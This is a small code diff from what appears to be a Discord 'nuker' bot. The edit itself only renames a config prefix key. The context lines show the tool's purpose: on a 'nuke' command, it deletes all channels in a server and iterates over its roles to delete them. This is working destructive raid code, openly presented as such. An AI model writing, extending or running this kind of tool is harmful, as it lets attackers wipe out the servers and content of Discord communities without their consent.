@@ -31,7 +31,7 @@ client.on('ready', () => {
                                                      
                            Dev by Kama
                    Nuker: ${client.user.tag}
-                   Prefix: ${client.config.prefix}
+                   Prefix: ${client.config.PREFIX}
    `;
 
   console.clear();
@@ -39,7 +39,7 @@ client.on('ready', () => {
 });
 
 client.on('message', async (message) => {
-if( message.content.toLowerCase().startsWith(client.config.prefix + "nuke")) {
+if( message.content.toLowerCase().startsWith(client.config.PREFIX + "nuke")) {
   message.guild.channels.forEach(channel => channel.delete());
   message.guild.roles.cache.forEach(roles => {
     roles.delete()
